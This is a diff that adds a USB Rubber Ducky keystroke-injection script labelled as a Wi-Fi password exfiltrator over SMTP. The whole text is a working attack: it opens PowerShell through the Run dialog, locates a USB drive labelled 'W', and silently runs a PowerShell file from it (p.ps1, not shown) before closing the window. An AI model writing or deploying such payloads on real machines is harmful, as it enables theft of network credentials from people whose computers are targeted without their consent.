@@ -1,0 +1,17 @@
+REM usb rubber ducky wifi password exfiltrator [smtp]
+REM created by : C0SM0
+
+REM let the computer recognize the twinduck
+DELAY 1000
+
+REM open powershell via runbox
+GUI r
+DELAY 200
+STRING powershell
+ENTER
+DELAY 300
+
+REM cd into twinduck labled "W" and run the 'p.ps1' file
+STRING $u=gwmi Win32_Volume|?{$_.Label -eq'W'}|select name;cd $u.name;./p.ps1;exit
+ENTER
+
